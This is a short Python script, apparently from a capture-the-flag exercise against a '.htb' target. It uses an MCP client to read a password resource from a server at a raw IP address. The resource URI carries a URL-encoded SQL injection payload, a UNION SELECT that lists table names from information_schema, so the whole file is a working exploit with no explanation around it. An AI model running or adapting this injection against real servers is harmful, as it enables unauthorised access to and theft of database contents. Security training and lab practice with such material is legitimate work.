import asyncio
from fastmcp import Client

client = Client("http://154.57.164.72:30981/mcp/")

async def main():
    async with client:
        result = await client.read_resource("password://rootlocker.htb%27and%20%27a%27%3D%27b%27%20union%20select%20group_concat%28table_name%29%20FROM%20information_schema.tables%20--%20-%20")
        print(result[0].text)

asyncio.run(main())